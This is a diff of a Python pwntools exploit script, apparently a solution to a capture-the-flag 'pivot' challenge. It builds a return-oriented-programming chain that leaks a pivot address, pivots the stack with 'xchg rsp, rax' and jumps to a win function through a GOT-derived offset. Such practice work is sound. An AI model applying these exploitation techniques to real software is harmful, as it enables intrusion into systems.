@@ -1,8 +1,16 @@
 import struct
+import sys
 
-read_prefix_addr = 0x4008bc
-new_rbp_value    = 0x601300
-pivot_dest       = 0x601800
+import pwn
+
+### Whether to run statically and dumo the exploit or
+### dynamically with pwntools.
+static = False
+if len(sys.argv) > 1:
+    if sys.argv[1] == '-s':
+        static = True
+
+pwnme_addr     = 0x4008f1
 
 buf_addr       = 0x7fffffffe0d0
 saved_rip_addr = 0x7fffffffe0f8
@@ -27,13 +35,7 @@ class Exploit():
 
         self.hints = []
 
-        self.padding_int = 0
-
-    def pad(self, num_bytes, b = None):
-        if b is None:
-            b = bytes([self.padding_int])
-            self.padding_int += 1
-            
+    def pad(self, num_bytes, b = b"a"):
         self.payload += b * num_bytes
         self.hints.extend(["padding"] * (num_bytes//8))
 
@@ -69,39 +71,55 @@ class Exploit():
         for i in range(len(self.payload) // 8):
             chunk = self.payload[8*i: 8*i + 8]
 
-            print("0x{:>3x}".format(8 * i),
-                  "0x{:016x}".format(int.from_bytes(chunk, "little")),
+            print("0x{:016x}".format(int.from_bytes(chunk, "little")),
                   "   ->", self.hints[i])
 
-exploit = Exploit()
+### Exploit we'll execute after pivoting to the new stack.
+real_exploit = Exploit()
 
-### Add 0x100 bytes of padding to get through first read call.
-exploit.pad(0x100)
-
-### Add chain to call read again, but into a known address.
-exploit.pad(saved_rip_addr - buf_addr - 8)
-exploit.append_word(new_rbp_value, hint = "new rbp value")
-exploit.append_pop_rax_chain(pivot_dest)
-exploit.append_word(read_prefix_addr, "back into main")
-
-### Add chain to write into the actual pivot area.
 ### First we need to call foothold function so that its
 ### actual address is loaded into the GOT.
-exploit.append_word(plt_foothold_addr, hint = "load foothold in GOT")
+real_exploit.append_word(plt_foothold_addr, hint = "load foothold in GOT")
 
-exploit.append_pop_rax_chain(got_foothold_addr)
-exploit.append_word(mov_rax_from_mem_addr, hint = "mov rax, [rax]")
-exploit.append_pop_rbp_chain(ret2win_addr - foothold_addr)
-exploit.append_word(add_rax_rbp_addr, hint = "add rax, rbp")
-exploit.append_word(jmp_rax_addr, hint = "jmp rax")
+real_exploit.append_pop_rax_chain(got_foothold_addr)
+real_exploit.append_word(mov_rax_from_mem_addr, hint = "mov rax, [rax]")
+real_exploit.append_pop_rbp_chain(ret2win_addr - foothold_addr)
+real_exploit.append_word(add_rax_rbp_addr, hint = "add rax, rbp")
+real_exploit.append_word(jmp_rax_addr, hint = "jmp rax")
 
-exploit.pad(0x100 + 0x40 + 0x100 - len(exploit.payload))
+real_exploit.pad(0x100 - len(real_exploit.payload), b = b"x")
 
-### Append the chain that will pivot the stack.
-exploit.pad(saved_rip_addr - buf_addr)
-exploit.append_pop_rax_chain(pivot_dest)
-exploit.append_word(xchg_rsp_rax_addr, hint = "xchg rsp, rax")
+#print("Exploit on the pivoted stack:")
+#real_exploit.show_with_hints()
 
-exploit.show_with_hints()
+if static:
+    pivot_dest = 0x7ffff7bf8f10
+    
+else:
+    ### Start the process with pwntools.
+    p = pwn.process("./pivot")
 
-exploit.write("payload")
+    ### Extract the pivot destination from the output.
+    preface = p.recvuntil(b"> ")
+    print(preface)
+    temp = preface[preface.index(b"0x") + 2: ]
+    pivot_dest_str = temp[: temp.index(b"\n")]
+    pivot_dest = int(pivot_dest_str, base = 16)
+    print(hex(pivot_dest))
+
+### Exploit that will actually perform the pivot.
+pivot_exploit = Exploit()
+
+pivot_exploit.pad(saved_rip_addr - buf_addr)
+pivot_exploit.append_pop_rax_chain(pivot_dest)
+pivot_exploit.append_word(xchg_rsp_rax_addr, hint = "xchg rsp, rax")
+
+if static:
+    with open("payload", "wb") as f:
+        f.write(real_exploit.payload)
+        f.write(pivot_exploit.payload)
+
+else:
+    p.send(real_exploit.payload + pivot_exploit.payload)
+
+    print(p.recvall())
